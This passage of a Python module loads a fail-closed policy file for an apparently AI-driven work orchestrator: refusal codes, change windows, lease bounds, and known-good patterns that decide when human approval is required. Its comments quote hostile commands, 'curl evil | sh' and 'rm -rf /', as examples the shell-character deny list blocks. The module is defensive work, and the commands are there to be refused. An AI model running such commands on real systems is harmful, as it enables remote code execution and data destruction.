"""The policy artifact: one versioned document, keyed on reach (WS-P2.18 Increment 2, ADR-0010).

WS-P2.18 replaces four scattered policies -- the authority known-good pattern, the change window,
the per-key lease, and self-update -- with a single versioned document keyed on what a package's
work touches when it runs (``reach``, ADR-0009). This module is that document's loader. The
document itself is ``factory-policy.toml``, next to this file.

**Its only expressible output is a refusal.** There is no permission in this schema and no boolean
in this module: :meth:`FactoryPolicy.refusals_for` returns the reasons policy objects, and an empty
tuple means "this policy raises no objection", which is a strictly weaker claim than "go ahead".
Permission is the conjunction of every admission check, of which policy is one term and the hard
off-switch is another. Policy can only ever lengthen the list of objections, so it cannot widen
what that switch allows -- not by convention or by check ordering, but because a widening is
unwritable. This module deliberately imports nothing from ``orchestrator.config``: it cannot read
the off-switch, so it cannot overrule it.

**Nothing is cached.** The artifact is read and parsed on every call. A cache is the mechanism by
which a policy change silently fails to take effect, and this surface has no volume that would
justify one -- so noticing an edit costs no restart. Getting new bytes onto a running process is a
separate question, answered by how the image ships (see ADR-0010).

**Unknown resolves restrictively, in all four directions.** An undeclared reach, a member outside
the vocabulary, and a member with no row each produce a refusal rather than an absence of one; and
a malformed document or an unrecognised schema version raises a named error rather than yielding an
empty policy, because an empty policy is the permissive reading of a broken file.

**Total coverage, no implicit default.** Every member of ``REACH_VOCABULARY`` must have exactly one
row, and a row for a member the vocabulary does not know is an error. That makes the artifact a
pinned projection of the vocabulary rather than a second copy of it: a new member added without a
row does not fall through to something lenient, it stops the document loading.

**Schema version 2 adds known-good patterns (ADR-0011), and they are still refusals.** A pattern is
a declared, dated, reasoned description of an envelope shape. It grants nothing: what it does is
withhold the ``authority_envelope_novel`` objection from an envelope it recognises. Every other
envelope draws that objection, so the human-authority requirement is the DEFAULT and recognition is
the exception -- which is why a pattern that fails to load, a reach nobody declared, and a field no
pattern accounts for all resolve the same way, to asking.

**Schema version 3 made an undeclared reach refuse admission, and schema version 6 removed the
exemption it carried (ADR-0047).** Schema 3 grandfathered a named list of revision ids from that
refusal and required the list to die; its one remaining subject was never broken down, so the table
and its loader went in one change. A document still carrying ``[grandfathered]`` names an unknown
top-level key and does not load. Every revision is now held to the same rule: no declared reach, no
admission.

**Schema version 4 adds the change window, and it too is only a refusal.** A window is the hours in
which policy raises no objection to work of a reach STARTING; outside them the objection is
``outside_change_window``. Written the other way round -- "work may run between these hours" -- it
would be a grant, and this schema has no way to express one. Three properties are load-bearing.
A row with no window declared raises no objection at all, and that is DISTINGUISHABLE from a window
that failed to parse, which stops the document loading. Composition over a reach set is the union
of its members' refusals, as everywhere else, so a unit reaching two places must be inside BOTH
windows -- which means windows on rows that occur together have to overlap, or that combination can
never run. And the window is asked about an INSTANT, never about a wall-clock reading of the local
machine: :func:`_window_open` converts, and never constructs a local time from a naive one.

**Schema version 5 adds the per-reach lease, which is a number, and it is STILL only a refusal
(ADR-0013).** A lease is the period during which this orchestrator refuses to hand a unit to a
second claimant, so a longer one is a longer refusal. Three properties make that literally true
rather than a way of speaking. A declared lease must be strictly longer than
:data:`~orchestrator.kernel.leases.DEFAULT_LEASE`, so the artifact can only ever lengthen what the
build already refuses for -- there is no way to write a shorter hold, which is the direction that
would let policy hand a live worker's unit away sooner. It is bounded above by
:data:`~orchestrator.kernel.leases.LEASE_CEILING`, so it cannot be written large enough to switch
reassignment off. And composition over a reach set is the MAXIMUM, which is the same monotonicity
the refusal sets have: adding a member can only lengthen the answer, exactly as adding a member can
only lengthen the list of objections. A row that declares nothing contributes the default, so a set
is shortened only when every member of it was decided to be shorter -- which none can be.

**A duration is not in the admission conjunction at all, and that is why it is safe for it to be a
number.** :meth:`FactoryPolicy.lease_for` is consulted after work has already been admitted,
claimed and sent; it cannot cause work to run that the hard off-switch refuses, because it is never
asked whether work may run.

**Schema version 7 moves what kind of work the factory takes at all into this document, and it is
written the way known-good patterns are: as objections a declared set withholds.** Every unit's
``required_capability`` draws ``capability_not_enabled`` and every change class draws
``change_class_not_allowed``; a value named in ``[admission]`` withholds that one objection and
nothing else. Two things follow, and both are what made the move safe. An empty list withholds
nothing, so it refuses every value -- the reading the process settings these lists came from gave an
unset variable, so moving them changed no answer. And withholding one term leaves every other term
standing: the off-switch, the runner-vocabulary and level checks on the envelope, the authority and
conformance terms. The capabilities are also bounded by a set this build owns, as a lease is: a
name outside ``RUNNER_CAPABILITIES`` stops the document loading, so this table can never name work
no runner performs. Change classes are free strings and have no such vocabulary to be bounded by.
The table is top-level rather than per reach row because the question it answers -- what kind of
work this factory takes -- is the same whatever the work touches; four rows would be four copies of
one value, and keying it on reach would be a new dimension nobody decided.
"""

from __future__ import annotations

import shlex
import tomllib
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from datetime import UTC, date, datetime, time, timedelta
from pathlib import Path
from typing import Any, Final
from uuid import UUID
from zoneinfo import ZoneInfo

from orchestrator.capability_vocabulary import RUNNER_CAPABILITIES
from orchestrator.errors import DomainError
from orchestrator.kernel.authority import AuthorityEnvelope
from orchestrator.kernel.leases import DEFAULT_LEASE, LEASE_CEILING
from orchestrator.reach_vocabulary import REACH_VOCABULARY

PACKAGED_ARTIFACT: Final[Path] = Path(__file__).parent / "factory-policy.toml"

# The schema versions this loader understands. A version outside this set is a named failure, never
# a best-effort read: an older process meeting a newer document would silently ignore whatever
# narrowing the new version introduced, which is the permissive reading of a version skew. A new
# version is therefore a coordinated change -- the loader learns it in the same commit that ships
# the document at it and the code that reads its new field.
SUPPORTED_SCHEMA_VERSIONS: Final[frozenset[int]] = frozenset({7})

# Why policy objects. These are the whole output vocabulary of this module.
REACH_UNDECLARED: Final = "reach_undeclared"
REACH_UNRECOGNISED: Final = "reach_unrecognised"
REACH_NOT_IN_POLICY: Final = "reach_not_in_policy"
AUTHORITY_ENVELOPE_NOVEL: Final = "authority_envelope_novel"
OUTSIDE_CHANGE_WINDOW: Final = "outside_change_window"
CAPABILITY_NOT_ENABLED: Final = "capability_not_enabled"
CHANGE_CLASS_NOT_ALLOWED: Final = "change_class_not_allowed"

_ROW_REQUIRED_FIELDS = frozenset({"rationale", "decided"})
_ROW_OPTIONAL_FIELDS = frozenset({"known_good", "change_window", "lease"})
_TOP_LEVEL_FIELDS = frozenset({"version", "admission", "reach"})
_ADMISSION_FIELDS = frozenset({"rationale", "decided", "capabilities", "change_classes"})
_WINDOW_FIELDS = frozenset({"rationale", "decided", "timezone", "start", "end"})
_LEASE_FIELDS = frozenset({"rationale", "decided", "minutes"})
_PATTERN_FIELDS = frozenset(
    {
        "name",
        "rationale",
        "decided",
        "change_class",
        "capabilities",
        "max_attempts",
        "max_llm_calls",
        "conformance_status",
        "target_repositories",
        "command_prefixes",
    }
)

# The one envelope shape schema 2 can describe: a unit that runs an ordered command list against
# one repository. Every stored envelope of that shape carries exactly these constraint keys --
# three from the authoring side and `work_unit_id`, which the orchestrator stamps. The set is
# EXACT, so a constraint nobody declared is an envelope no pattern recognises. A different shape
# (a unit that runs no commands, say) is a different schema version, not a looser check here.
_CONSTRAINT_FIELDS = frozenset(
    {"allowed_commands", "mutation_commands", "target_repository", "work_unit_id"}
)
# The one optional key of that same shape (SDS 1.1 item 3c-1). `verify_commands` names which of
# `allowed_commands` the runner executes, after the mutators, as its verify script; it can only
# repeat commands already in `allowed_commands` (`runner_command_authority_violation`), so it
# declares no command the pattern has not already matched -- and it is still matched by prefix
# itself, so recognition never rests on the subset rule having run first. Its absence is the
# shape every envelope before 3c-1 carries, and that shape must stay recognised. The artifact's
# document schema is unchanged: patterns declare no new field.
_OPTIONAL_CONSTRAINT_FIELDS = frozenset({"verify_commands"})
_COMMAND_CONSTRAINT_FIELDS = ("allowed_commands", "mutation_commands", "verify_commands")
_CONFORMANCE_FIELDS = frozenset({"status", "standards_touched", "accepted_standards"})

# Characters through which a command string could become more than the one invocation its declared
# prefix describes: chaining, substitution, redirection, expansion, globbing. A command carrying
# any of them OUTSIDE quotes is not recognised, whatever prefix it starts with -- otherwise
# `uv add x; curl evil | sh` would match the prefix `uv add`. Held as a string rather than a set
# because it is a character class: there is no other side that enumerates these, so there is
# nothing for it to agree with.
_SHELL_CONTROL_CHARACTERS: Final = ";&|<>()$`\\\n\r\t*?!{}#~"


def _invalid(detail: str) -> DomainError:
    return DomainError(
        "factory_policy_invalid",
        f"the policy artifact is invalid: {detail}",
        "correct factory-policy.toml; a document that does not load permits nothing",
    )


def _not_an_instant() -> DomainError:
    """Policy was asked "is it now" with something that names no moment.

    A naive datetime is not a time this module can answer about: converting one assumes the zone of
    whatever machine is running, which is the single most common way a window becomes wrong on a
    server and wrong twice a year at home. Refusing is the only honest answer, and every caller
    turns it into a refusal rather than into an absence of one.
    """
    return DomainError(
        "factory_policy_clock_invalid",
        "policy was asked about a time carrying no zone, which names no instant",
        "supply a timezone-aware time; policy refuses rather than guessing a zone for it",
    )


@dataclass(frozen=True)
class KnownGoodPattern:
    """An envelope shape somebody decided, on a date, for a stated reason (ADR-0011).

    Declared, never learned. Every field NARROWS: an envelope is recognised only when the pattern
    accounts for all of it, so a pattern that omits a field describes fewer envelopes rather than
    more. There is no field here whose absence widens anything, and none that permits.
    """

    name: str
    rationale: str
    decided: date
    change_class: str
    capabilities: Mapping[str, str]
    max_attempts: int
    max_llm_calls: int
    conformance_status: str
    target_repositories: frozenset[str]
    command_prefixes: tuple[tuple[str, ...], ...]


@dataclass(frozen=True)
class ChangeWindow:
    """The hours somebody decided work of this reach may start in, held as a refusal boundary.

    Declared in LOCAL time with an explicit zone, because the question a window answers is about a
    person's day and a day is a local thing. The zone is a field rather than an assumption: a naive
    local reading is wrong on a server, which runs in UTC, and wrong twice a year everywhere else.

    ``start`` after ``end`` wraps midnight, which is the shape a nightly window naturally has.
    ``start`` equal to ``end`` is rejected at load, because it reads equally as a window of no
    length and one of a whole day, and a policy nobody can read is a policy nobody decided.
    """

    rationale: str
    decided: date
    zone: ZoneInfo
    start: time
    end: time


@dataclass(frozen=True)
class Lease:
    """How long somebody decided this orchestrator refuses to reassign work of this reach.

    Written in whole minutes, because the question is how much slack a run of this shape needs
    before somebody else may have the unit, and nobody decides that to the second.

    ``duration`` is validated at load to be strictly longer than ``DEFAULT_LEASE`` and no longer
    than ``LEASE_CEILING``. The lower bound is the polarity guarantee -- a row can only lengthen a
    refusal -- and it also means a row cannot restate the default, which would be a second copy of
    a number that already lives in the kernel.
    """

    rationale: str
    decided: date
    duration: timedelta


@dataclass(frozen=True)
class AdmissionPosture:
    """What kind of work this factory takes at all, as two sets that withhold an objection.

    Not a grant. Every capability and change class draws its objection unless it is named here, so
    an empty set objects to every value -- and withholding either objection leaves every other
    admission term exactly where it was.
    """

    rationale: str
    decided: date
    capabilities: frozenset[str]
    change_classes: frozenset[str]


@dataclass(frozen=True)
class ReachPolicy:
    """One row -- everything policy currently says about a single reach member."""

    member: str
    rationale: str
    decided: date
    known_good: tuple[KnownGoodPattern, ...] = ()
    change_window: ChangeWindow | None = None
    lease: Lease | None = None


@dataclass(frozen=True)
class AuthorityRecognition:
    """Why policy objects to work running without a human authority approval.

    ``refusals`` empty means policy raises no objection -- weaker than "go ahead", as everywhere
    else here: the human requirement is one term in an admission conjunction, and lifting it lifts
    nothing else. ``recognised_by`` names the patterns that withheld the objection, and is what a
    suppression record cites; it is empty whenever any refusal stands.
    """

    refusals: tuple[str, ...]
    recognised_by: tuple[str, ...]


@dataclass(frozen=True)
class FactoryPolicy:
    """A loaded artifact. Answers only in refusals."""

    version: int
    source: str
    admission: AdmissionPosture
    rows: Mapping[str, ReachPolicy]

    def posture_refusal(self, required_capability: str, change_class: str) -> str | None:
        """Why policy objects to this kind of work; ``None`` means it raises no objection.

        Two terms, asked in the order admission has always reported them: a capability nobody named
        draws its objection before the change class is looked at, so an operator is sent to the
        first thing that is wrong. Neither set is consulted for anything but membership, so naming
        a value can only withhold that one objection.
        """
        if required_capability not in self.admission.capabilities:
            return CAPABILITY_NOT_ENABLED
        if change_class not in self.admission.change_classes:
            return CHANGE_CLASS_NOT_ALLOWED
        return None

    def refusals_for(self, reach: Sequence[str] | None) -> tuple[str, ...]:
        """Why this policy objects to work of the given reach; empty means it does not object.

        Composition over a reach set is the union of its members' refusals, which is the same
        thing as intersection-of-permission (ADR-0009): adding a member can only lengthen the
        result, never shorten it.
        """
        if not reach:
            return (REACH_UNDECLARED,)
        refusals: set[str] = set()
        for member in reach:
            if member not in REACH_VOCABULARY:
                refusals.add(REACH_UNRECOGNISED)
            elif member not in self.rows:
                refusals.add(REACH_NOT_IN_POLICY)
        return tuple(sorted(refusals))

    def window_refusal(self, reach: Sequence[str] | None, now: datetime) -> str | None:
        """Why policy objects to work of this reach STARTING at ``now``; ``None`` means it does not.

        A separate question from :meth:`refusals_for`, and separate on purpose. That one asks
        whether the declaration is usable at all, which nothing but editing the package can fix;
        this one asks whether it is the time, which fixes itself. Reporting the second in place of
        the first would send an operator away to wait for a moment that changes nothing.

        Composition is the union of the members' objections, so a unit reaching two places must be
        inside both windows. A member with no window contributes nothing, which is why declaring one
        can only ever narrow.

        **A reach nobody declared draws no window objection, and that is deliberate and bounded.**
        Every window hangs off a reach row, so there is no row to consult and no honest way to pick
        one -- reach is declared, never inferred (ADR-0009 R8), and the fail-closed-looking
        alternative of requiring every window at once is worse than it sounds: two rows whose hours
        do not overlap would make such work unrunnable forever rather than merely restrained. The
        exposure is empty: the admission term refuses every undeclared reach, with no exemption
        since schema 6 (ADR-0047).
        """
        # Before the early return, not after it: a clock this module cannot read is a fault whether
        # or not this particular reach would have consulted a window, and a guard that only fires on
        # the paths that were going to answer anyway is a guard with a hole in the shape of its
        # cheapest case.
        if now.tzinfo is None or now.utcoffset() is None:
            raise _not_an_instant()
        if not reach:
            return None
        for member in reach:
            row = self.rows.get(member)
            if row is None or row.change_window is None:
                continue
            if not _window_open(row.change_window, now):
                return OUTSIDE_CHANGE_WINDOW
        return None

    def window_opened_at(self, member: str, now: datetime) -> datetime | None:
        """When the window occurrence containing ``now`` began, or None if it is not open.

        The one question a rate rule needs and :meth:`window_refusal` cannot answer: "has anything
        already happened in THIS occurrence?" is a question about a boundary, not about a boolean.
        Computing it in the caller would mean a second reading of the artifact's hours, which is
        the second copy this module exists to prevent -- so it is here, where the hours already
        are, and it answers in UTC because that is what a stored timestamp is compared against.

        Wrapping windows (a start after an end) are the ordinary nightly shape, so the occurrence
        of a window open at 02:30 began at 02:00 today, while one open at 00:30 under a 22:00-06:00
        window began at 22:00 YESTERDAY. Both are computed from the local date, because a window is
        declared in local time and a day is a local thing.
        """
        if now.tzinfo is None or now.utcoffset() is None:
            raise _not_an_instant()
        row = self.rows.get(member)
        if row is None or row.change_window is None:
            return None
        window = row.change_window
        if not _window_open(window, now):
            return None
        local = now.astimezone(window.zone)
        opened = local.replace(
            hour=window.start.hour,
            minute=window.start.minute,
            second=0,
            microsecond=0,
        )
        if opened > local:
            # The occurrence began on the previous local day, which is the case a wrapping window
            # is in for every instant after midnight.
            opened -= timedelta(days=1)
        return opened.astimezone(UTC)

    def lease_for(self, reach: Sequence[str] | None) -> timedelta:
        """How long this policy refuses to reassign work of this reach to a second claimant.

        The one answer in this module that is not a refusal *code*, and it is still a refusal: what
        it names is a period in which the orchestrator will not give the unit to anybody else. The
        artifact can only make that period longer, because ``_lease`` rejects anything at or below
        the default at load, and it cannot make it unbounded, because ``_lease`` rejects anything
        above the ceiling. So there is no value writable here that hands a unit away sooner than
        this build already would.

        **Composition is the MAXIMUM**, which is the same monotonicity the refusal sets have and
        the same direction: adding a member can only lengthen the answer. A member with no lease
        declared, one this build does not recognise, and one no row covers all contribute the
        DEFAULT rather than nothing -- so an incomplete or unreadable declaration pulls the answer
        toward the default it started at, and never below it.

        **Undeclared reach gets the default and does not raise.** Refusing here would be refusing
        to grant a lease at all, which is refusing to let a worker hold a unit it has already been
        given -- restraint pointed at the wrong actor. Whether such a unit should have been sent is
        the admission question, and ``reach_admission`` already answers it.
        """
        if not reach:
            return DEFAULT_LEASE
        return max(self._member_lease(member) for member in reach)

    def _member_lease(self, member: str) -> timedelta:
        row = self.rows.get(member)
        return DEFAULT_LEASE if row is None or row.lease is None else row.lease.duration

    def authority_refusals(
        self,
        reach: Sequence[str] | None,
        envelope: AuthorityEnvelope,
        unit_id: UUID,
    ) -> AuthorityRecognition:
        """Why policy objects to this envelope running without a human authority approval.

        A pattern is declared UNDER a reach row, so a work unit that reaches two places must be
        recognised under both -- the same union-of-refusals composition ``refusals_for`` uses, and
        the same reason: a member can only add objections. Reach nobody declared, or a member this
        build does not know, is answered by ``refusals_for`` before any pattern is consulted, so an
        unclassifiable reach never reaches the matcher at all.

        **An undeclared reach draws ``reach_undeclared`` here too, and that is load-bearing.** With
        no reach there is no row, and with no row no pattern is consulted, so an empty answer would
        fall straight through and lift the gate on an envelope nothing recognised. Any future
        exemption from declaring reach must never be applied to this answer: an exemption from
        admission has never meant that a person need not read the envelope.
        """
        refusals = set(self.refusals_for(reach))
        if refusals or reach is None:
            return AuthorityRecognition(tuple(sorted(refusals)), ())
        names: set[str] = set()
        for member in reach:
            name = _recognising_pattern(self.rows[member], envelope, unit_id)
            if name is None:
                refusals.add(AUTHORITY_ENVELOPE_NOVEL)
            else:
                names.add(name)
        if refusals:
            return AuthorityRecognition(tuple(sorted(refusals)), ())
        return AuthorityRecognition((), tuple(sorted(names)))

    def report(self) -> dict[str, Any]:
        """What this process is enforcing, for an operator reading the running instance."""
        return {
            "version": self.version,
            "source": self.source,
            "admission": {
                "rationale": self.admission.rationale,
                "decided": self.admission.decided,
                "capabilities": sorted(self.admission.capabilities),
                "change_classes": sorted(self.admission.change_classes),
            },
            # Without these two an operator cannot read a row's `lease: null`: it means "the
            # default applies", and the default lives in the image rather than in the document.
            # The ceiling is served alongside because it is the other half of what a row may say.
            "lease_bounds": {
                "default_minutes": int(DEFAULT_LEASE.total_seconds() // 60),
                "ceiling_minutes": int(LEASE_CEILING.total_seconds() // 60),
            },
            "reach": [
                {
                    "member": row.member,
                    "rationale": row.rationale,
                    "decided": row.decided,
                    "known_good": [_pattern_report(pattern) for pattern in row.known_good],
                    "change_window": _window_report(row.change_window),
                    "lease": _lease_report(row.lease),
                }
                for row in self.rows.values()
            ],
        }


def _window_open(window: ChangeWindow, now: datetime) -> bool:
    """Whether the instant ``now`` falls inside the window's local hours.

    The instant is CONVERTED into the window's zone. A local wall time is never constructed from a
    naive one, and that single choice is what makes daylight saving total rather than ambiguous --
    the ambiguity lives entirely in the other direction, where one local reading names two instants
    or none.

    The two awkward hours therefore behave without a special case, and both directions are stated
    here because neither is obvious. On the day an hour occurs TWICE, both occurrences read as the
    same local time, so a window covering that hour is open across both of them -- one extra hour of
    openness, once a year, in the widening direction. On the day an hour DOES NOT OCCUR, no instant
    ever reads as a local time inside it, so a window covering only that hour is open for no time at
    all that day -- in the narrowing direction, which is the safe one to be surprised by.
    """
    local = now.astimezone(window.zone).time()
    if window.start < window.end:
        return window.start <= local < window.end
    return local >= window.start or local < window.end


def _window_report(window: ChangeWindow | None) -> dict[str, Any] | None:
    if window is None:
        return None
    return {
        "rationale": window.rationale,
        "decided": window.decided,
        # `ZoneInfo.key` is the name the artifact declared, so the operator reads back what was
        # written rather than an offset that is only true for half the year.
        "timezone": window.zone.key,
        "start": window.start.isoformat(timespec="minutes"),
        "end": window.end.isoformat(timespec="minutes"),
    }


def _lease_report(lease: Lease | None) -> dict[str, Any] | None:
    """What a row declares, or ``None`` for a row that relies on the default.

    Reported in the minutes it was written in rather than as a duration, so an operator reads back
    the number somebody decided. ``None`` is not "no lease": every claim gets one, and a row
    declaring nothing means the default applies -- which is why the report also carries the default
    itself, next to the ceiling that bounds what a row may say.
    """
    if lease is None:
        return None
    return {
        "rationale": lease.rationale,
        "decided": lease.decided,
        "minutes": int(lease.duration.total_seconds() // 60),
    }


def _pattern_report(pattern: KnownGoodPattern) -> dict[str, Any]:
    return {
        "name": pattern.name,
        "rationale": pattern.rationale,
        "decided": pattern.decided,
        "change_class": pattern.change_class,
        "capabilities": dict(sorted(pattern.capabilities.items())),
        "max_attempts": pattern.max_attempts,
        "max_llm_calls": pattern.max_llm_calls,
        "conformance_status": pattern.conformance_status,
        "target_repositories": sorted(pattern.target_repositories),
        "command_prefixes": [" ".join(prefix) for prefix in pattern.command_prefixes],
    }


def _recognising_pattern(
    row: ReachPolicy, envelope: AuthorityEnvelope, unit_id: UUID
) -> str | None:
    """The name of the first pattern in this row that recognises the envelope, or ``None``."""
    for pattern in row.known_good:
        if _recognises(pattern, envelope, unit_id):
            return pattern.name
    return None


def _recognises(pattern: KnownGoodPattern, envelope: AuthorityEnvelope, unit_id: UUID) -> bool:
    """Whether the pattern accounts for EVERY field of the envelope.

    Totality is the whole guarantee. ``normalized()`` has six fields and each is checked here, so
    an envelope carrying anything the pattern did not describe falls through to the human. That
    includes ``unknown_fields``, which is how a field this build has never heard of is refused
    rather than ignored -- the fingerprint records such a field by NAME only, so its value was
    never attested by anyone.
    """
    return (
        not envelope.unknown_fields
        and envelope.change_class == pattern.change_class
        and envelope.capabilities.items() <= pattern.capabilities.items()
        and _within(envelope.budgets.max_attempts, pattern.max_attempts)
        and _within(envelope.budgets.max_llm_calls, pattern.max_llm_calls)
        and _conformance_recognised(envelope.conformance, pattern.conformance_status)
        and _constraints_recognised(pattern, envelope.constraints, unit_id)
    )


def _within(value: int | None, ceiling: int) -> bool:
    """A declared budget at or below the pattern's ceiling. ``None`` is unbounded, so it is not."""
    return value is not None and value <= ceiling


def _conformance_recognised(conformance: Mapping[str, Any] | None, status: str) -> bool:
    """The claim must be complete, green by the pattern's own word, and waive nothing.

    A non-empty ``accepted_standards`` is a waiver -- the branch in admission that lets a claim
    through on standards somebody agreed to accept rather than on standards being met. Whatever
    else that is, it is not routine, so it is exactly the case a human still looks at.
    """
    if conformance is None or set(conformance) != _CONFORMANCE_FIELDS:
        return False
    touched = conformance["standards_touched"]
    return (
        conformance["status"] == status
        and conformance["accepted_standards"] == []
        and isinstance(touched, list)
        and all(isinstance(standard, str) for standard in touched)
    )


def _constraints_recognised(
    pattern: KnownGoodPattern, constraints: Mapping[str, Any], unit_id: UUID
) -> bool:
    if set(constraints) - _OPTIONAL_CONSTRAINT_FIELDS != _CONSTRAINT_FIELDS:
        return False
    # The stamped id is fingerprinted by value, so leaving it unaccounted for would be a hole in
    # the totality claim above. It can only ever be this unit's own id.
    if constraints["work_unit_id"] != str(unit_id):
        return False
    if constraints["target_repository"] not in pattern.target_repositories:
        return False
    return all(
        _commands_recognised(constraints[field], pattern.command_prefixes)
        for field in _COMMAND_CONSTRAINT_FIELDS
        if field in constraints
    )


def _commands_recognised(value: object, prefixes: tuple[tuple[str, ...], ...]) -> bool:
    if not isinstance(value, list) or not value:
        return False
    return all(isinstance(command, str) and _command(command, prefixes) for command in value)


def _command(command: str, prefixes: tuple[tuple[str, ...], ...]) -> bool:
    """Whether one command is inert and begins with a declared prefix.

    Both halves are load-bearing and neither is sufficient. A prefix alone bounds only the first
    tokens, and ``uv add x && rm -rf /`` begins with ``uv add``. Inertness alone bounds only the
    grammar, and an inert command can still be any program on the machine.
    """
    if not _inert(command):
        return False
    try:
        tokens = shlex.split(command)
    except ValueError:
        return False
    return any(tuple(tokens[: len(prefix)]) == prefix for prefix in prefixes)


def _inert(command: str) -> bool:
    """No shell control character outside quotes, and no quote left open.

    Quote tracking is what makes this usable rather than merely strict: the real commands carry
    version specifiers like ``'ruff>=0.15.21'``, whose ``>`` is a redirection everywhere except
    inside the quotes it is actually written in. Scanned character by character rather than lexed,
    because a lexer resolves quoting and hands back tokens in which an unquoted ``>`` and a quoted
    one are indistinguishable -- which is the direction that fails open.
    """
    quote = ""
    for character in command:
        if quote:
            quote = "" if character == quote else quote
        elif character in "'\"":
            quote = character
        elif character in _SHELL_CONTROL_CHARACTERS:
            return False
    return not quote


def load_factory_policy(path: Path = PACKAGED_ARTIFACT) -> FactoryPolicy:
    """The artifact at ``path``, validated. Raises rather than returning a degraded policy."""
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as error:
        raise _invalid(f"{path.name} could not be read") from error
    try:
        document = tomllib.loads(text)
    except tomllib.TOMLDecodeError as error:
        raise _invalid(f"{path.name} is not valid TOML: {error}") from error
    return FactoryPolicy(
        version=_schema_version(document),
        source=path.name,
        admission=_admission(document),
        rows=_rows(document),
    )


def _schema_version(document: Mapping[str, Any]) -> int:
    unknown = set(document) - _TOP_LEVEL_FIELDS
    if unknown:
        raise _invalid("it declares unknown top-level keys: " + ", ".join(sorted(unknown)))
    version = document.get("version")
    # `bool` is an `int` in Python, and `version = true` is a shape error rather than version 1.
    if not isinstance(version, int) or isinstance(version, bool):
        raise _invalid("`version` must be present and an integer")
    if version not in SUPPORTED_SCHEMA_VERSIONS:
        raise DomainError(
            "factory_policy_version_unsupported",
            f"the policy artifact declares schema version {version}, which this build does "
            "not understand",
            "ship a build that knows this schema version, or restore the artifact to one it does",
        )
    return version


def _admission(document: Mapping[str, Any]) -> AdmissionPosture:
    """The ``[admission]`` table, which must be present and declare exactly its four fields.

    Absent is a load failure rather than an empty posture, for the reason every other absence here
    is: there is no implicit default, and a document that does not load permits nothing. An EMPTY
    list is different and is allowed -- it is a decision that this factory takes no such work, and
    it reads the same way an unset list always has, as refusing every value.
    """
    value = document.get("admission")
    if not isinstance(value, dict) or set(value) != _ADMISSION_FIELDS:
        raise _invalid(
            "`[admission]` must be a table declaring exactly "
            + ", ".join(sorted(_ADMISSION_FIELDS))
        )
    capabilities = _member_set("admission", "capabilities", value["capabilities"])
    outside = sorted(capabilities - RUNNER_CAPABILITIES)
    if outside:
        raise _invalid(
            "`admission.capabilities` names work no runner performs: " + ", ".join(outside)
        )
    return AdmissionPosture(
        rationale=_text("admission", "rationale", value["rationale"]),
        decided=_decided("admission", value["decided"]),
        capabilities=capabilities,
        change_classes=_member_set("admission", "change_classes", value["change_classes"]),
    )


def _member_set(where: str, field: str, value: object) -> frozenset[str]:
    """A list of distinct non-empty strings, possibly empty. A repeat is a typo, not a decision."""
    if not isinstance(value, list):
        raise _invalid(f"`{where}.{field}` must be an array of strings")
    for entry in value:
        if not isinstance(entry, str) or not entry.strip() or entry != entry.strip():
            raise _invalid(f"`{where}.{field}` entries must be non-empty strings without padding")
    if len(set(value)) != len(value):
        raise _invalid(f"`{where}.{field}` names the same value twice")
    return frozenset(value)


def _rows(document: Mapping[str, Any]) -> Mapping[str, ReachPolicy]:
    table = document.get("reach")
    if not isinstance(table, dict):
        raise _invalid("it must declare a `[reach]` table")
    missing = sorted(set(REACH_VOCABULARY) - set(table))
    extra = sorted(set(table) - set(REACH_VOCABULARY))
    if missing or extra:
        raise _invalid(
            "every reach member needs exactly one row and no others are allowed"
            + (f"; missing: {', '.join(missing)}" if missing else "")
            + (f"; unknown: {', '.join(extra)}" if extra else "")
        )
    return {member: _row(member, table[member]) for member in sorted(table)}


def _row(member: str, value: object) -> ReachPolicy:
    if not isinstance(value, dict):
        raise _invalid(f"`[reach.{member}]` must be a table")
    declared = set(value)
    if (
        not _ROW_REQUIRED_FIELDS <= declared
        or declared - _ROW_REQUIRED_FIELDS - _ROW_OPTIONAL_FIELDS
    ):
        raise _invalid(
            f"`[reach.{member}]` must declare "
            + ", ".join(sorted(_ROW_REQUIRED_FIELDS))
            + " and at most "
            + ", ".join(sorted(_ROW_OPTIONAL_FIELDS))
            + f"; it declares {', '.join(sorted(declared)) or 'nothing'}"
        )
    rationale = value["rationale"]
    if not isinstance(rationale, str) or not rationale.strip():
        raise _invalid(f"`[reach.{member}].rationale` must be a non-empty string")
    return ReachPolicy(
        member=member,
        # Wrapped in the file for review; one sentence on the wire.
        rationale=" ".join(rationale.split()),
        decided=_decided(f"reach.{member}", value["decided"]),
        known_good=_patterns(member, value.get("known_good", [])),
        # Absent is "this policy raises no objection on window grounds" -- never a default window,
        # and never confusable with one that failed to parse, which stops the document loading.
        change_window=(
            _change_window(member, value["change_window"]) if "change_window" in value else None
        ),
        # Absent is "the default hold is the right one here", which is a decision as much as a
        # declared one is -- and the artifact records the reason for it in the row's rationale
        # rather than in a field that would restate the kernel's number.
        lease=(_lease(member, value["lease"]) if "lease" in value else None),
    )


def _change_window(member: str, value: object) -> ChangeWindow:
    where = f"reach.{member}.change_window"
    if not isinstance(value, dict) or set(value) != _WINDOW_FIELDS:
        raise _invalid(
            f"`[{where}]` must be a table declaring exactly " + ", ".join(sorted(_WINDOW_FIELDS))
        )
    start = _local_time(where, "start", value["start"])
    end = _local_time(where, "end", value["end"])
    if start == end:
        raise _invalid(
            f"`{where}.start` and `{where}.end` are the same time, which reads equally as a "
            "window of no length and one of a whole day"
        )
    return ChangeWindow(
        rationale=_text(where, "rationale", value["rationale"]),
        decided=_decided(where, value["decided"]),
        zone=_zone(where, value["timezone"]),
        start=start,
        end=end,
    )


def _lease(member: str, value: object) -> Lease:
    """One row's declared lease, bounded on both sides by numbers this build owns.

    The two bounds do different jobs and both are load-bearing. The lower one is the polarity
    guarantee: a declared lease must be strictly LONGER than the default, so nothing writable here
    hands a unit to a second claimant sooner than this build already would, and no row can restate
    a number that already lives in the kernel. The upper one is why "policy cannot switch
    reassignment off" is true of the values an operator can write rather than only of the type --
    the same reason `dead_letter_stalled_approval_seconds` is capped.
    """
    where = f"reach.{member}.lease"
    if not isinstance(value, dict) or set(value) != _LEASE_FIELDS:
        raise _invalid(
            f"`[{where}]` must be a table declaring exactly " + ", ".join(sorted(_LEASE_FIELDS))
        )
    minutes = value["minutes"]
    if not isinstance(minutes, int) or isinstance(minutes, bool):
        raise _invalid(f"`{where}.minutes` must be an integer number of minutes")
    duration = timedelta(minutes=minutes)
    if not DEFAULT_LEASE < duration <= LEASE_CEILING:
        raise _invalid(
